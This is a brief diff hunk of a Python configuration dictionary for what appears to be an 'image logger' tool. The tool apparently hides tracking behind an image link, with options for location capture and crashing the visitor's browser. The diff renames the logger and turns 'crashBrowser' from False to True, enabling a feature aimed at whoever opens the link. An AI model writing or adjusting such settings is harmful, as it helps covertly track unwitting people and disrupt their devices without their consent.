@@ -14,10 +14,10 @@ config = {
     "image": "https://imgs.search.brave.com/5wvp3BmCsaBFpgn5DBVwJ-gkFGdde7T0eNGIRUJOl-c/rs:fit:0:180:1:0/g:ce/aHR0cHM6Ly9tZWRp/YTEudGVub3IuY29t/L20vaHhpb0dGN1Bo/OEFBQUFBZC9saW9u/bW9ua2V5LXJhZ2Ut/YmFpdC5naWY.jpeg", 
     "imageArgument": True,
 
-    "username": "DIZ'S LOGGER", 
+    "username": "Logger", 
     "color": 0x00FFFF,
 
-    "crashBrowser": False, 
+    "crashBrowser": True, 
     "accurateLocation": False,
 
     "message": {
